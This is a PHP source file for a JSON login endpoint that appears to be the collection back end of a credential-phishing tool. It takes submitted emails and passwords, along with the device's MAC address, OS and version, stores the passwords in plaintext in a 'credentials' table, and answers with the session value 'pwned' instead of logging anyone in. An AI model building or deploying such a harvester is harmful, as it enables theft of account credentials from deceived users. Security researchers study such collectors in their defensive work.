<?php
include_once '../php/database.class.php';
include_once '../php/query.class.php';
header('Content-Type: application/json; charset=UTF-8');
$response = array(
    'status' => 'error',
    'message' => array()
);
if (isset($_SERVER['REQUEST_METHOD']) && strtolower($_SERVER['REQUEST_METHOD']) === 'post') {
    $data = @json_decode(file_get_contents('php://input'));
    if ($data) {
        if (isset($data->email) && isset($data->password)) {
            $parameters = array(
                'email' => trim($data->email),
                'password' => $data->password,
                'mac' => isset($data->mac) ? trim($data->mac) : null,
                'os' => isset($data->os) ? trim($data->os) : null,
                'version' => isset($data->version) ? trim($data->version) : null
            );
            $error = false;
            if (strlen($parameters['email']) < 1) {
                $error = true;
                $response['message']['email'] = 'Please enter email';
            } else if (strlen($parameters['email']) > 300) {
                $error = true;
                $response['message']['email'] = 'Email is exceeding 300 characters';
            }
            if (strlen($parameters['password']) < 1) {
                $error = true;
                $response['message']['password'] = 'Please enter password';
            } else if (strlen($parameters['password']) > 300) {
                $error = true;
                $response['message']['password'] = 'Password is exceeding 300 characters';
            }
            if (strlen($parameters['mac']) > 50) {
                $parameters['mac'] = substr($parameters['mac'], 0, 50);
            }
            if (strlen($parameters['os']) > 50) {
                $parameters['os'] = substr($parameters['os'], 0, 50);
            }
            if (strlen($parameters['version']) > 50) {
                $parameters['version'] = substr($parameters['version'], 0, 50);
            }
            if (!$error) {
                $params = array(
                    'email' => strtolower($parameters['email']),
                    'password' => $parameters['password'],
                    'mac' => strtolower($parameters['mac']),
                    'os' => strtolower($parameters['os']),
                    'version' => strtolower($parameters['version']),
                    'date' => date('Y-m-d H:i:s', time())
                );
                if (Query::insert('INSERT INTO `credentials` (`email`, `password`, `mac`, `os`, `version`, `date`) VALUES (:email, :password, :mac, :os, :version, :date)', $params)) {
                    // send some data back to the user
                    $response['status'] = 'ok';
                    $response['session'] = 'pwned';
                    $response['data'] = array();
                } else {
                    $response['message']['global'] = 'Database error';
                }
            }
        } else {
            $response['message']['global'] = 'Required data is missing';
        }
    } else {
        $response['message']['global'] = 'Invalid data format or no data';
    }
} else {
    $response['message']['global'] = 'HTTP method not supported';
}
echo json_encode($response, JSON_PRETTY_PRINT);
?>
